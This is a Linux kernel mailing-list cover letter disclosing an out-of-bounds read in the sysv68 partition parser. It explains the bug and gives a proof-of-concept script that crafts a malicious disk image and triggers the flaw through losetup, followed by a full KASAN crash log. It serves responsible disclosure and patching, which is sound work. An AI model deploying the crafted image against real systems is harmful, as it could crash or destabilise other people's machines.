Received: from mail-pz2-f12.google.com (mail-pz2-f12.google.com [74.125.228.12])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 76F2A2D949C
	for <linux-block@vger.kernel.org>; Tue, 22 Sep 2026 03:40:38 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.228.12
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1790048440; cv=none; b=tOQlFE4Z0clo5Wry6PdYXsbgvjL6oFQemSTU6vQvENDfM9GxpqfBA3XUwB3715c8WNm3xPapim7p8g7oyvLYkh1fZGRzxIt59gcxwDAIVGa4mFthlxP7nkHcXB6v1CmwPYuVgIJA/1x9mQQXpK7UL//tJNOZNWUHgxfI2+/8R1M=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1790048440; c=relaxed/simple;
	bh=whULmkEjiieaaIBgf/FDbKWHVBh3eY/TGp4QJ1J/zhw=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=GI/EJODckzs8ZRqB8GwJUF5c3eETV0kf/aixYxs8O4/q2VGXSLoZqi+SoBOBlLsoVcrMjZMsUVrxntNUjxeM8SvkX47IPU4i6Xj3CMwwtBeR4RDvxVclqy+3Ac2JvK0UpV4l5b/qgl0Osf2m5PL3DOR4a5NkNIEHMB7JTlLDKOs=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=Z8jRBI8+; arc=none smtp.client-ip=74.125.228.12
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="Z8jRBI8+"
Received: by mail-pz2-f12.google.com with SMTP id d2e1a72fcca58-85469b355ffso2208888b3a.1
        for <linux-block@vger.kernel.org>; Mon, 21 Sep 2026 20:40:38 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1790048438; x=1790653238; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=n1XPfAZ2+O9mLoWdV2uW3HLaQ0AIO/cukzRW/u2wZq4=;
        b=Z8jRBI8+Ixs0qlTWfAihfLESt9NBwqkLnKFgAWrUbEEXdbuez7NHtYVyXYZeJ1RMQs
         A55nZIoGAul1occvCW7DExbrtUzqePE5T17+ZBpIw1IOSOcjLHNOPpC8QpSLR8plFaS+
         zeA21kAqFNnb7xCPvrp6M364slkLU6Gb+YuSdqr5YWQCjGHZjgVKsHN9y7LMjEDbV+lR
         11+ocrrQ9Cpxh2rfoPhiBHUJyLd+q5EQC6qC7MslnSQQZEwq9Em8CL4I8L5+Or13Q+Nb
         WCLWg25eKYjbqNA0MkRVhz5bEeZH55q4ep5eqVP7LASZcfQSc9OUzYqe9ThhmWREfmlo
         rOSQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1790048438; x=1790653238;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=n1XPfAZ2+O9mLoWdV2uW3HLaQ0AIO/cukzRW/u2wZq4=;
        b=M3Xo62ROsisOa3yqtpCMo1qhTgxG4d2NM5+YLWqtfcG6Ly3g+aRDic1nQ5RSae4Vey
         W6WyaAOwbpBh5whmD8m0/khRBqMsmBgpJPXj+jfVwaWz7IkEqUb/x+uG18lwz7wI4uCr
         qjmfh3bGjBn0tn1WnCWU5HNfs6hNEPc7BMfzdLCgvAIsQ6UzGMfrY+GGfMS3Ct5rsYfj
         aCwp9K+/UxcFTuK30h7JYT4HQitDAWAw60pkvRFyCnEQnRSRqIczgNy2wpum9DrB0Oeu
         vJ/MzimFFk83aGdxKZbdw09YG3oveQZlu3EeDL2yLRskE5kaUH3kgap44rPFhgn08y+M
         cKHA==
X-Gm-Message-State: AFuF++myTUtcE8kk+wTrL4HbznJl5cRoFkKRQ/NaUKHs7SlC3+nKQydg
	V3m26zmvziDKqUk7OU/r80o4PeIiny08kvL4cUbRi/WxNKTQeuFVqbVkT8XLYr+8xHHcqGtwdaP
	OflUGdcwL
X-Gm-Gg: AYBFou2kf4+I/7JdSJqK72oesNVqCbDDH+X80fU0W2Wy8GYIlYxRxC1WbDztebZYtB4
	7JW3O6fIq/Ws32KzFEITDV1E3BL8u/FxgThTaYVGyJGQEc9NQyXweBqTOooOsTF3skJNndDHU+h
	40t3WM1bYiXx9c8iEM4SPRVpQSDG0PWob9h4/EqkTcVYJFZKwASrvBX4eW9xfI1g3tpvskzyxRZ
	DOrExQTgC+mZ0/Tycq6AowkS50ZHhkfQJfqYEWK3rN+XbBojeQQ3sh6CBm1gfJbqgTg9kj57VC9
	Wyuwmf80n/Ehf0q24qlxJBCrzJNdIaEYCK1LFzLuRYphCqILM+Y20t+RYbBxvKmAVQ6hDn53ioO
	qQFvqgrX2iUO3PoFAQ784Wyz0I8MQKGjYshJGOYUNp0J8pqVtyg5bf48qUSMkL+4Z+QxYsrog3Q
	Bu0iKk+9/ZFyFkGkuRZ/MpDF5oMpkd35HWBNF2v98wbPdZ1d02xlS4WShsCdLExrobx7IHUpXTl
	RkZOlIo
X-Received: by 2002:a05:6a00:6c9f:b0:87a:c93:b837 with SMTP id d2e1a72fcca58-87a0ca2fb0bmr5845476b3a.39.1790048437650;
        Mon, 21 Sep 2026 20:40:37 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([167.71.204.91])
        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-87c324d0154sm151769b3a.23.2026.09.21.20.40.32
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Mon, 21 Sep 2026 20:40:37 -0700 (PDT)
From: Ren Wei <weir@nebusec.ai>
To: linux-block@vger.kernel.org
Cc: axboe@kernel.dk,
	kees@kernel.org,
	objecting@objecting.org,
	phdm@macqel.be,
	akpm@linux-foundation.org,
	vega@nebusec.ai,
	rakukuip@gmail.com,
	weir@nebusec.ai
Subject: [PATCH 0/1] block: partitions: sysv68: validate slice count
Date: Tue, 22 Sep 2026 11:40:09 +0800
Message-ID: <cover.1790005101.git.rakukuip@gmail.com>
X-Mailer: git-send-email 2.53.0
Precedence: bulk
X-Mailing-List: linux-block@vger.kernel.org
List-Id: <linux-block.vger.kernel.org>
List-Subscribe: <mailto:linux-block+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-block+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Luxiao Xu <rakukuip@gmail.com>

Hi Linux kernel maintainers,

We found and validated an out-of-bounds read issue in
block/partitions/sysv68.c. The bug can be reached when mounting or
scanning partitions on a crafted disk image. We have tested it, and
it should not affect normal partition parsing.

We will provide detailed information about the bug in this email,
along with a PoC to trigger it.

---- details below ----

Bug details:

sysv68_partition() trusts ios_slccnt from the on-disk SYSV68 config
block even though it only reads one 512-byte slice-table sector.
Each slice entry is 8 bytes, so at most 64 entries fit in that
sector. The parser subtracts one and then iterates slices - 1
entries without bounding the count to 64:

slices = be16_to_cpu(b->dk_ios.ios_slccnt);
...
data = read_part_sector(state, i, &sect);
...
slices -= 1;
slice = (struct slice *)data;
for (i = 0; i < slices; i++, slice++) {
	if (be32_to_cpu(slice->nblocks)) {
		...
	}
}

read_part_sector() maps the folio containing sector n and returns a
pointer to that sector inside the folio. With ios_slcblk = 7, the
slice table starts at offset 7 * 512 = 3584 inside a 4096-byte folio.
The 64 valid entries occupy exactly bytes 3584..4095. Setting
ios_slccnt = 66 makes the loop execute 65 iterations after the - 1,
so iteration 64 dereferences slice->nblocks at offset 4096 and reads
beyond the mapped page.

In this run KASAN classified the resulting access as a use-after-free
because the adjacent page happened to be a freed page, but the
triggering condition is still the out-of-bounds read in
sysv68_partition().

Reproducer:

We run the reproducer in an x86 QEMU environment with KASAN enabled.

------BEGIN poc.sh------
#!/bin/sh
set -eu

IMG=${1:-/root/sysv68.img}
TRIES=${TRIES:-256}
LOOP=

if [ "$(id -u)" -ne 0 ]; then
	echo "run as root" >&2
	exit 1
fi

trap 'if [ -n "$LOOP" ]; then /usr/sbin/losetup -d "$LOOP" >/dev/null 2>&1 || true; fi' EXIT

sysctl -q -w kernel.panic_on_warn=0 >/dev/null 2>&1 || true

python3 - "$IMG" <<'PY'
import struct
import sys

path = sys.argv[1]
img = bytearray(4096)

# dkblk0 sector 0: "MOTOROLA" magic at offset 248.
img[248:256] = b"MOTOROLA"

# dkconfig lives in the second 256-byte half of sector 0.
# ios_slcblk = 7 places the slice table in the last 512-byte sector of a 4K page.
struct.pack_into(">I", img, 384, 7)
# ios_slccnt = 66 means sysv68_partition() iterates 65 entries after subtracting
# the synthetic "whole disk" slice, but only 64 entries fit in one sector.
struct.pack_into(">H", img, 388, 66)

with open(path, "wb") as f:
    f.write(img)
PY

i=1
while [ "$i" -le "$TRIES" ]; do
	dmesg -C
	sync
	echo 3 > /proc/sys/vm/drop_caches
	LOOP=$(/usr/sbin/losetup -f --show -P "$IMG")
	if dmesg | grep -q 'BUG: KASAN:'; then
		echo "loop device: $LOOP" >&2
		echo "triggered on attempt: $i" >&2
		dmesg | sed -n '/BUG: KASAN:/,$p'
		exit 0
	fi
	/usr/sbin/losetup -d "$LOOP" >/dev/null 2>&1 || true
	LOOP=
	i=$((i + 1))
done

echo "KASAN did not trigger after $TRIES attempts" >&2
dmesg | sed -n '/sysV68:/,$p'
exit 1
------END poc.sh--------

----BEGIN crash log----
[  338.338417] [  T10655] BUG: KASAN: use-after-free in sysv68_partition+0x552/0x620
[  338.338646] [  T10655] Read of size 4 at addr ff11000071dac000 by task losetup/10655

[  338.338716] [  T10655] CPU: 3 UID: 0 PID: 10655 Comm: losetup Not tainted 7.0.0-08308-g9e1e9d660255 #1 PREEMPT(full)
[  338.338727] [  T10655] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  338.338759] [  T10655] Call Trace:
[  338.338778] [  T10655]  <TASK>
[  338.338797] [  T10655]  dump_stack_lvl+0x78/0xe0
[  338.338975] [  T10655]  print_report+0xf7/0x600
[  338.339101] [  T10655]  ? sysv68_partition+0x552/0x620
[  338.339110] [  T10655]  ? srso_alias_return_thunk+0x5/0xfbef5
[  338.339210] [  T10655]  ? __virt_addr_valid+0x231/0x420
[  338.339306] [  T10655]  ? sysv68_partition+0x552/0x620
[  338.339316] [  T10655]  kasan_report+0xe4/0x120
[  338.339333] [  T10655]  ? sysv68_partition+0x552/0x620
[  338.339362] [  T10655]  sysv68_partition+0x552/0x620
[  338.339379] [  T10655]  ? __pfx_atari_partition+0x10/0x10
[  338.339388] [  T10655]  ? adfspart_check_ADFS+0x3b0/0x470
[  338.339399] [  T10655]  ? __pfx_sysv68_partition+0x10/0x10
[  338.339420] [  T10655]  ? __pfx_sysv68_partition+0x10/0x10
[  338.339432] [  T10655]  bdev_disk_changed+0x58e/0x13a0
[  338.339462] [  T10655]  ? __pfx_bdev_disk_changed+0x10/0x10
[  338.339473] [  T10655]  ? kobject_uevent_env+0x258/0x14f0
[  338.339513] [  T10655]  loop_reread_partitions+0x70/0x130
[  338.339665] [  T10655]  loop_configure+0xea4/0x1350
[  338.339713] [  T10655]  ? __pfx_loop_configure+0x10/0x10
[  338.339752] [  T10655]  ? srso_alias_return_thunk+0x5/0xfbef5
[  338.339778] [  T10655]  lo_ioctl+0x698/0x1a10
[  338.339800] [  T10655]  ? __pfx_lo_ioctl+0x10/0x10
[  338.339814] [  T10655]  ? srso_alias_return_thunk+0x5/0xfbef5
[  338.339826] [  T10655]  ? kasan_quarantine_put+0x10a/0x240
[  338.339833] [  T10655]  ? srso_alias_return_thunk+0x5/0xfbef5
[  338.339842] [  T10655]  ? lockdep_hardirqs_on+0x7b/0x110
[  338.339870] [  T10655]  ? srso_alias_return_thunk+0x5/0xfbef5
[  338.339883] [  T10655]  ? __pfx_blk_get_meta_cap+0x10/0x10
[  338.339943] [  T10655]  ? srso_alias_return_thunk+0x5/0xfbef5
[  338.339963] [  T10655]  ? srso_alias_return_thunk+0x5/0xfbef5
[  338.339971] [  T10655]  ? blkdev_common_ioctl+0x993/0x2550
[  338.339996] [  T10655]  ? __pfx_tomoyo_path_number_perm+0x10/0x10
[  338.340162] [  T10655]  ? kmem_cache_free+0x2a6/0x6f0
[  338.340206] [  T10655]  blkdev_ioctl+0x3e1/0x570
[  338.340219] [  T10655]  ? __pfx_blkdev_ioctl+0x10/0x10
[  338.340229] [  T10655]  ? __x64_sys_openat+0x122/0x1e0
[  338.340280] [  T10655]  ? srso_alias_return_thunk+0x5/0xfbef5
[  338.340303] [  T10655]  __x64_sys_ioctl+0x139/0x1c0
[  338.340335] [  T10655]  do_syscall_64+0x116/0xf80
[  338.340356] [  T10655]  ? irqentry_exit+0x117/0x830
[  338.340371] [  T10655]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  338.340396] [  T10655] RIP: 0033:0x7f167355d91b
[  338.340436] [  T10655] Code: 00 48 89 44 24 18 31 c0 48 8d 44 24 60 c7 04 24 10 00 00 00 48 89 44 24 08 48 8d 44 24 20 48 89 44 24 10 b8 10 00 00 00 0f 05 <89> c2 3d 00 f0 ff ff 77 1c 48 8b 44 24 18 64 48 2b 04 25 28 00 00
[  338.340443] [  T10655] RSP: 002b:00007fff9959a860 EFLAGS: 00000246 ORIG_RAX: 0000000000000010
[  338.340476] [  T10655] RAX: ffffffffffffffda RBX: 0000000000000004 RCX: 00007f167355d91b
[  338.340482] [  T10655] RDX: 00007fff9959ab30 RSI: 0000000000004c0a RDI: 0000000000000004
[  338.340487] [  T10655] RBP: 00007fff9959aa70 R08: 0000000000000000 R09: 0000000000000000
[  338.340491] [  T10655] R10: 0000000000000000 R11: 0000000000000246 R12: 00007f167344fb58
[  338.340495] [  T10655] R13: 0000000000000000 R14: 00007fff9959ab30 R15: 0000000000000003
[  338.340566] [  T10655]  </TASK>

[  338.340660] [  T10655] The buggy address belongs to the physical page:
[  338.340701] [  T10655] page: refcount:0 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x71dac
[  338.340738] [  T10655] flags: 0xfff00000000000(node=0|zone=1|lastcpupid=0x7ff)
[  338.340778] [  T10655] raw: 00fff00000000000 ffd4000001c1e708 ffd4000001c6d708 0000000000000000
[  338.340789] [  T10655] raw: 0000000000000000 0000000000000000 00000000ffffffff 0000000000000000
[  338.340798] [  T10655] page dumped because: kasan: bad access detected
[  338.340821] [  T10655] page_owner tracks the page as freed
[  338.341703] [  T10655] page last allocated via order 0, migratetype Unmovable, gfp_mask 0x440dc0(GFP_KERNEL_ACCOUNT|__GFP_ZERO|__GFP_COMP), pid 9875, tgid 9875 (v4l_id), ts 172983892810, free_ts 173380592272
[  338.343988] [  T10655]  post_alloc_hook+0x126/0x150
[  338.344058] [  T10655]  get_page_from_freelist+0x768/0x32b0
[  338.344088] [  T10655]  __alloc_frozen_pages_noprof+0x27b/0x2af0
[  338.344099] [  T10655]  alloc_pages_mpol+0x14a/0x440
[  338.344134] [  T10655]  alloc_pages_noprof+0x10/0x110
[  338.344159] [  T10655]  pte_alloc_one+0x1a/0x2a0
[  338.344178] [  T10655]  __do_fault+0x1d9/0x310
[  338.344204] [  T10655]  do_fault+0xb86/0x1230
[  338.344215] [  T10655]  __handle_mm_fault+0x1186/0x1f90
[  338.344228] [  T10655]  handle_mm_fault+0x2ad/0x8c0
[  338.344240] [  T10655]  do_user_addr_fault+0x495/0xdd0
[  338.344252] [  T10655]  exc_page_fault+0x64/0xd0
[  338.344264] [  T10655]  asm_exc_page_fault+0x26/0x30
[  338.344276] [  T10655] page last free pid 34 tgid 34 stack trace:
[  338.345059] [  T10655]  __free_frozen_pages+0x721/0xf60
[  338.345075] [  T10655]  tlb_remove_table_rcu+0x1e4/0x280
[  338.345103] [  T10655]  rcu_core+0x595/0x10d0
[  338.345178] [  T10655]  handle_softirqs+0x1ef/0xa00
[  338.345241] [  T10655]  run_ksoftirqd+0x3d/0x70
[  338.345253] [  T10655]  smpboot_thread_fn+0x301/0x9d0
[  338.345294] [  T10655]  kthread+0x312/0x410
[  338.345317] [  T10655]  ret_from_fork+0x600/0xa20
[  338.345370] [  T10655]  ret_from_fork_asm+0x1a/0x30

[  338.345450] [  T10655] Memory state around the buggy address:
[  338.345460] [  T10655]  ff11000071dabf00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
[  338.345469] [  T10655]  ff11000071dabf80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
[  338.345479] [  T10655] >ff11000071dac000: ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
[  338.345491] [  T10655]                    ^
[  338.345500] [  T10655]  ff11000071dac080: ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
[  338.345509] [  T10655]  ff11000071dac100: ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
[  338.345535] [  T10655] ==================================================================
[  338.359485] [  T10655] Disabling lock debugging due to kernel taint
[  338.359512] [  T10655]  loop0:sysV68: p(s65) p65(s64)
[  338.359581] [  T10655] loop0: partition table partially beyond EOD, truncated
[  338.360620] [  T10655] loop0: p65 start 2863311530 is beyond EOD, truncated
-----END crash log-----

Best regards,
Luxiao Xu

Luxiao Xu (1):
  block: partitions: sysv68: validate slice count

 block/partitions/sysv68.c | 4 ++++
 1 file changed, 4 insertions(+)

-- 
2.43.0
